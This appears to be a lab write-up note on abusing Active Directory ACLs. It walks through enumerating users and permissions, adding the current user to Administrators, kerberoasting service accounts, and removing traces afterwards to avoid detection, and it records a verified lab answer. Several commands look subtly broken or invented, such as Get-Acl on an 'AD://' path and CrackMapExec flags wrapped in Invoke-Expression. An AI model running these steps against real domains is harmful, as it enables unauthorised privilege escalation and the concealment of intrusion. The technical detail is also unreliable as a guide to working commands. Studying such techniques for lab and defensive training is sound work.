# 🛰️ Overview

## 🔍 Objectives
- Enumerate ACLs to identify potential privilege escalations
- Exploit discovered permissions to gain higher privileges
- Clean up traces of exploitation for stealth maintenance

## 📝 Requirements
- Active Directory environment with necessary permissions
- PowerShell and Python installed on the attacker machine
- Domain user credentials
- Tools like [[PowerView]], [[CrackMapExec]], and hash-cracking software (e.g., [[John the Ripper]])

---

## 🔑 Step-by-Step Exploitation

### 📄 Initial Setup & Enumeration
1. **Gather Initial Information**
   - Use `Get-DomainUser` to list all users.
   - Identify high-value targets like administrators.

```powershell
Import-Module ActiveDirectory
Get-DomainUser | Select Name,Enabled,SAMAccountName,DistinguishedName
```

2. **Enumerate ACLs for Privilege Escalation**
   - Check permissions on critical objects and groups.

```powershell
$targetGroup = "BUILTIN\Administrators"
(Get-Acl "AD://$targetGroup").Access | Select IdentityReference,FileSystemRights
```

### 🔎 Exploiting Identified ACLs
3. **Modify Group Membership**
   - Add current user to a high-privilege group.

```powershell
Add-DomainGroupMember -Identity $targetGroup -Members 'USER'
```

4. **Kerberoasting for High-value Targets**
   - Request TGS tickets for service accounts and export them.

```powershell
$serviceAccount = "Host/SVC"
Invoke-Expression "crackmapexec smb <IP> -d <DOMAIN> -u $serviceAccount --kerberoast > kerberos.txt"
```

### 🔍 Further Privilege Escalation
5. **Manipulate Group Membership Again**
   - Add high-value target to a lower privilege group.

```powershell
$lowPrivGroup = "LowPrivUsers"
Add-DomainGroupMember -Identity $lowPrivGroup -Members 'HIGH_VALUE_USER'
```

6. **Kerberoasting for Lower Privilege Accounts**
   - Use `crackmapexec` or similar tools to kerberoast and extract service account hashes.

```powershell
Invoke-Expression "crackmapexec smb <IP> -d <DOMAIN> --spn SVC/SERVER1@<DOMAIN> --user HIGH_VALUE_USER > spn_hashes.txt"
```

### 🚫 Cleanup Procedures
7. **Revert Group Membership Changes**
   - Remove current user from high-privilege groups.

```powershell
Remove-DomainGroupMember -Identity $targetGroup -Members 'USER'
```

8. **Clean Up Evidence**
   - Ensure no traces remain that indicate privilege escalation.

### 📝 Documenting the Attack Path

**🎯 Verified Answer: `SyncMaster757`**

---

## 🔍 Key Takeaways

### 🛡️ Attack Chain Mastery
1. **Multi-step Exploitation**: Complex attack paths requiring multiple privilege escalations.
2. **ACL Dependency**: Each step depends on previously discovered ACL permissions.
3. **Stealth Techniques**: Using Kerberoasting instead of direct password changes for high-value targets.
4. **Cleanup Importance**: Proper cleanup prevents detection and maintains professional standards.

### 📘 Technical Skills Developed
- **PowerView Mastery**: Advanced PowerShell AD manipulation.
- **Credential Management**: PSCredential objects and secure string handling.
- **Group Manipulation**: Strategic group membership modifications.
- **Kerberoasting**: SPN manipulation and TGS ticket extraction.
- **Hash Cracking**: Offline password recovery techniques.

### 🔒 Defensive Insights
- **Event Monitoring**: Critical Event IDs for ACL abuse detection.
- **SDDL Analysis**: Converting security descriptors to human-readable format.
- **Audit Policies**: Proper logging configuration for detection.
- **Regular Auditing**: Automated ACL and group membership monitoring.

### 📄 Professional Considerations
- **Documentation**: Every change must be documented for client review.
- **Cleanup Procedures**: Critical for maintaining client trust.
- **Impact Assessment**: Understanding potential disruption of admin accounts.
- **Communication**: Coordinating with the client for sensitive changes.

**🔑 This represents the practical culmination of ACL enumeration - from discovery to exploitation to cleanup - demonstrating complete adversarial simulation capabilities in enterprise Active Directory environments.**

---

---